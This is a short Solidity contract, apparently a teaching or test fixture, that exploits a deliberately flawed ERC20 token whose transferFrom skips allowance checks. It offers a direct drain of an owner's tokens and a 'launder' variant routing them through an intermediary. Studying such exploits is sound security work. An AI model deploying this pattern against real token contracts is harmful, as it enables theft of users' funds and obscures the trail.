import "./SecurityMistakesERC20.sol";

// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.7.0 <0.9.0;

/*  Use this contract to exploit security mistakes. It allows
the extra layer of delegated calls to our system which is often
how exploiters carry out their attacks
*/

contract SecurityExploiter {
  /** A single-hop exploit of a buggy transferFrom function that doesn't check allowances */
  function exploitTransferFrom(
    address exploitableContract,
    address owner,
    address recipient,
    uint numTokens
  ) public returns (bool) {
    SecurityMistakesERC20 exploited = SecurityMistakesERC20(exploitableContract);
    bool result = exploited.exploitableTransferFrom(owner, recipient, numTokens);
    return result;
  }

  /** A multi-hop exploit of a buggy transferFrom function that doesn't check allowances */
  function launderTransferFrom(
    address exploitableContract,
    address owner,
    address intermediary,
    address recipient,
    uint numTokens
  ) public returns (bool) {
    SecurityMistakesERC20 exploited = SecurityMistakesERC20(exploitableContract);
    bool firstResult = exploited.exploitableTransferFrom(owner, intermediary, numTokens);
    if (!firstResult) return firstResult;
    bool finalResult = exploited.exploitableTransferFrom(intermediary, recipient, numTokens);
    return finalResult;
  }
}
